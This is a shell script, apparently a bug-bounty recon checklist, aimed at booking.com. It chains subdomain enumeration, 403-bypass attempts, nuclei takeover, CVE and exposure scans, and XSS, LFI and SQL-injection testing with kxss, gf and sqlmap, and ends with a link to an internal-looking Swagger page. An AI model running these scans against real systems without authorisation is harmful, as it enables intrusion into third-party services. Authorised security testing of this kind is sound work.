
```sh
# Preperation
cd Operations
mkdir booking.com
cd booking.com
echo booking.com > target

# Do some Google Dorking
FGDS.sh booking.com

# Get all subdomains and hosts
sub.sh booking.com  # Get all subdomains
host.sh subdomains  # Get live subdomains as hosts
url.sh hosts.live

# Try to bypass 403!
403.sh hosts.403 # Test bypass 403 for all 403 hosts

# Subdomain takeover test.
nuclei -t ~/nuclei-templates/http/takeovers/ -l hosts.live


# Fuzzing urls
nuclei -l urls -t ~/nuclei-templates/http/fuzzing/

# Try to find Vulnerabilities
nuclei -l hosts.live -t ~/nuclei-templates/http/vulnerabilities/ -t ~/nuclei-templates/http/cves/ -t ~/nuclei-templates/http/exposures/

# Extract Params and js files from urls
cat urls | grep "=" | tee params
cat urls | grep -iE '.js' | grep -ivE '.json' | sort -u | tee js

# Try to find Vulnerabilities in js files
nuclei -t ~/nuclei-templates/http/exposures/ -l js -o js.bugs

# Test XSS
cat params | kxss

# Test lfi
cat urls  | uro > urls.uro
cat urls.uro | gf lfi
nuclei -l target -tags lfi


# Test sqli
sudo python3 sqlifinder.py -d booking.com
sqlmap -m params --batch --random-agent --level 1 | tee sqlmap



```

https://workforce-dev.booking.com/api/swagger/ui/index#/